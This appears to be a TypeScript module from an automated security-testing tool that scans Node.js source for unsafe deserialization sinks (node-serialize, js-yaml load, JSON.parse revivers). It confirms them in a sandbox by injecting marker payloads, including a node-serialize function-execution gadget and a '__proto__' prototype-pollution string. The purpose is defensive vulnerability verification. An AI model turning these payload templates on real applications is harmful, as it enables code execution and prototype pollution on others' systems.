import { readFileSync } from "node:fs";
import { dirname, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import type { Exploit } from "../types.js";
import type { Sandbox } from "../sandbox.js";
import {
  type Attacker,
  type StaticLead,
  nodeRunCommand,
  NODE_SOURCE_RE,
  freshMarker,
  nodeExportedNames,
} from "./attacker.js";
import { functionUnits } from "./broken-access-control.js";

const HERE = dirname(fileURLToPath(import.meta.url));

type DeserializationMode = "node-serialize" | "js-yaml" | "reviver-pollution";

const NODE_SERIALIZE_RE = /\b(?:unserialize|deserialize)\s*\(/i;
const YAML_LOAD_RE = /\b(?:jsYaml|safeYaml|yaml|yml|yamlParser|yamlLib)\s*\.\s*(?:load|loadAll)\s*\(/i;
const JSON_PARSE_CALL_RE = /\bJSON\.parse\s*\(/i;

function hasReviverArg(text: string): boolean {
  const m = text.match(/\bJSON\.parse\s*\(([\s\S]*?)\)/i);
  if (!m || !m[1]) return false;
  const args = m[1];
  const commaIndex = args.indexOf(",");
  if (commaIndex < 0) return false;
  const second = args.slice(commaIndex + 1).trim();
  if (!second || /^null\b/i.test(second)) return false;
  return /[A-Za-z_$][\w$]*|=>|function\b/.test(second);
}

function modesFromText(text: string): DeserializationMode[] {
  const modes = new Set<DeserializationMode>();
  if (NODE_SERIALIZE_RE.test(text)) modes.add("node-serialize");
  if (YAML_LOAD_RE.test(text)) modes.add("js-yaml");
  if (JSON_PARSE_CALL_RE.test(text) && hasReviverArg(text)) modes.add("reviver-pollution");
  return [...modes];
}

function modesFromEntryName(name: string): DeserializationMode[] {
  const modes = new Set<DeserializationMode>();
  if (/\b(?:unserialize|deserialize)\b/i.test(name)) modes.add("node-serialize");
  return [...modes];
}

/**
 * Collect file-level leads for sweep mode. They are broad but only sink-matches; each candidate still
 * requires a live CANARY / PoC fire to become an exploit in the gate path.
 */
function deserializationLeads(source: string): StaticLead[] {
  const leads: StaticLead[] = [];
  const lines = source.split("\n");
  for (let i = 0; i < lines.length; i++) {
    const modes = new Set<DeserializationMode>(modesFromText(lines[i]));
    for (const mode of modes) {
      if (mode === "node-serialize") leads.push({ line: i + 1, sink: "unserialize" });
      if (mode === "js-yaml") leads.push({ line: i + 1, sink: "yaml-load" });
      if (mode === "reviver-pollution") leads.push({ line: i + 1, sink: "json-parse-reviver" });
    }
  }
  return leads;
}

function sinkForMode(mode: DeserializationMode): string {
  if (mode === "node-serialize") return "node-serialize(deserialize)";
  if (mode === "js-yaml") return "yaml.load";
  return "json.parse(reviver)";
}

function modeLineInBody(body: string, bodyStartLine: number, mode: DeserializationMode): number {
  const lines = body.split("\n");
  const re = mode === "reviver-pollution" ? JSON_PARSE_CALL_RE : mode === "node-serialize" ? NODE_SERIALIZE_RE : YAML_LOAD_RE;
  for (let i = 0; i < lines.length; i++) {
    if (re.test(lines[i])) return bodyStartLine + i;
  }
  return bodyStartLine;
}

/**
 * A one-shot probe for one exported function:
 * - For node-serialize / js-yaml unsafe loads, use marker assignment gadgets that are only triggered by
 *   vulnerable deserializers that execute attacker-supplied code.
 * - For JSON.parse reviver sinks, use a `__proto__` payload and detect prototype pollution, which is
 *   the observable side effect a prototype-polluting reviver introduces.
 */
function unsafeDeserializerDriver(moduleRel: string, fnName: string, marker: string, modes: DeserializationMode[]): string {
  const mod = JSON.stringify("./" + moduleRel);
  const fn = JSON.stringify(fnName);
  const mk = JSON.stringify(marker);
  const probeKey = `__raeuber_deser_${marker}`;
  const probeField = `__raeuber_proto_${marker.slice(0, 6)}`;
  const nodeExpression = `_$$ND_FUNC$$_function(){globalThis["${probeKey}"] = ${mk}; return ${mk};}()`;
  const nodePayload = JSON.stringify({ __rce: nodeExpression });
  const yamlPayload = JSON.stringify({ __yaml_exec: `globalThis["${probeKey}"] = ${mk}; return ${mk};` });
  const reviverPayload = JSON.stringify(`{"__proto__":{"${probeField}":${mk}}}`);

  return `
const MARKER = ${mk};
const MOD = ${mod};
const FN = ${fn};
const MODES = new Set(${JSON.stringify(modes)});
const PROBE_KEY = ${JSON.stringify(probeKey)};
const PROBE_FIELD = ${JSON.stringify(probeField)};
const NODE_PAYLOAD = ${JSON.stringify(nodePayload)};
const YAML_PAYLOAD = ${JSON.stringify(yamlPayload)};
const REVOKE_PAYLOAD = ${JSON.stringify(reviverPayload)};

let m;
try {
  m = await import(MOD);
} catch (e) {
  process.stdout.write("IMPORT_FAIL:" + e);
  process.exit(0);
}

function pick(name) {
  if (m && typeof m[name] === "function") return m[name];
  if (m && m.default && typeof m.default[name] === "function") return m.default[name];
  return null;
}

const fn = pick(FN);
if (!fn) {
  process.stdout.write("NOT_A_FUNCTION");
  process.exit(0);
}

async function callWithPayload(payload) {
  try {
    await fn(payload);
  } catch {
    // A thrown exception does not invalidate the PoC unless a marker is visible through side effects.
  }
}

for (const mode of ["node-serialize", "js-yaml", "reviver-pollution"]) {
  if (!MODES.has(mode)) continue;

  if (mode === "reviver-pollution") {
    try {
      delete Object.prototype[PROBE_FIELD];
    } catch {}
    await callWithPayload(REVOKE_PAYLOAD);
    if (Object.prototype[PROBE_FIELD] === MARKER) {
      process.stdout.write("UNSAFE_DESERIALIZATION_FIRED mode=" + mode);
      process.exit(0);
    }
    continue;
  }

  delete globalThis[PROBE_KEY];
  const payload = mode === "node-serialize" ? NODE_PAYLOAD : YAML_PAYLOAD;
  await callWithPayload(payload);
  if (globalThis[PROBE_KEY] === MARKER) {
    process.stdout.write("UNSAFE_DESERIALIZATION_FIRED mode=" + mode);
    process.exit(0);
  }
}

process.stdout.write("UNSAFE_DESERIALIZATION_NOFIRE");
`.trim();
}

export class UnsafeDeserializationAttacker implements Attacker {
  readonly attackClass = "unsafe-deserialization" as const;
  readonly canaryFixtureDir = resolve(HERE, "..", "..", "fixtures", "unsafe-deserialization-node");

  handles(file: string): boolean {
    return NODE_SOURCE_RE.test(file);
  }

  staticLeads(source: string): StaticLead[] {
    return deserializationLeads(source);
  }

  hunt(targetDir: string, files: string[], sandbox: Sandbox): Exploit[] {
    const exploits: Exploit[] = [];
    for (const file of files) {
      if (!this.handles(file)) continue;
      let source: string;
      try {
        source = readFileSync(join(targetDir, file), "utf8");
      } catch {
        continue;
      }

      const exported = new Set(nodeExportedNames(source));
      const entries = functionUnits(source)
        .filter((entry) => exported.has(entry.name))
        .map((entry) => {
          const modes = new Set<DeserializationMode>([
            ...modesFromText(entry.body),
            ...modesFromEntryName(entry.name),
          ]);
          return { name: entry.name, line: entry.line, body: entry.body, modes: [...modes] as DeserializationMode[] };
        })
        .filter((entry) => entry.modes.length > 0);

      if (entries.length === 0) continue;
      for (const entry of entries) {
        const marker = freshMarker();
        const driverRel = `.raeuber-unsafe-deserialization-${marker}.mjs`;
        sandbox.writeFile(driverRel, unsafeDeserializerDriver(file, entry.name, marker, entry.modes));
        const run = sandbox.exec(`${nodeRunCommand(targetDir)} ${driverRel} 2>&1`, 15_000);
        const out = run.stdout + run.stderr;
        const m = out.match(/UNSAFE_DESERIALIZATION_FIRED mode=([a-z-]+)/);
        if (!m) continue;

        const mode = m[1] as DeserializationMode;
        const sinkLine = modeLineInBody(entry.body, entry.line, mode);
        exploits.push({
          attackClass: "unsafe-deserialization",
          proof: "marker-executed",
          file,
          line: sinkLine,
          sink: `unsafe-deserialization(${sinkForMode(mode)})`,
          summary:
            `Exported \`${entry.name}\`() accepts attacker input and drove an unsafe deserialization mode (` +
            `${mode}); a marker payload produced process-visible side effects that prove execution risk.`,
          payload: `${entry.name}(marker-driven payload)`,
          evidence:
            `driver reported mode=${mode} as fired for ${entry.name}(${marker}):\n` +
            out.slice(0, 900),
        });
        break;
      }
      if (exploits.length > 0) break;
    }
    return exploits;
  }
}
